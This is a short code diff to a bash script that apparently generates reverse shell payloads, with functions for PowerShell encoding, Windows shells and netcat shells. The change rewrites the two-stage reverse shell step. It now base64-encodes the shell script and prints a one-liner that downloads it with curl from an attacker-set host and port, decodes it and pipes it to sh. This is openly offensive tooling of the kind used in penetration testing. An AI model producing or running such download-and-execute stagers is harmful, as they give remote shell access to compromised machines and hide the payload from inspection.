@@ -167,7 +167,6 @@ encode_powershell() {
     fi
 }
 
-
 prepare_generic_windows_shell() {
     if [ -z "$host_port" ]; then
         host_port=4444  # Default reverse shell port
@@ -392,8 +391,8 @@ get_twostage_reverse_shell() {
     fi
     echo '#!/bin/bash' > reverse_shell.sh
     echo "$cmd" >> reverse_shell.sh
-    chmod +x reverse_shell.sh
-    echo "curl http://$http_ip:$http_port/reverse_shell.sh | sh"
+    base64 -w0 reverse_shell.sh > reverse_shell.b64
+    echo "curl http://$http_ip:$http_port/reverse_shell.b64 | base64 -d | sh"
 }
 
 get_nc_reverse_shell_powershell() {
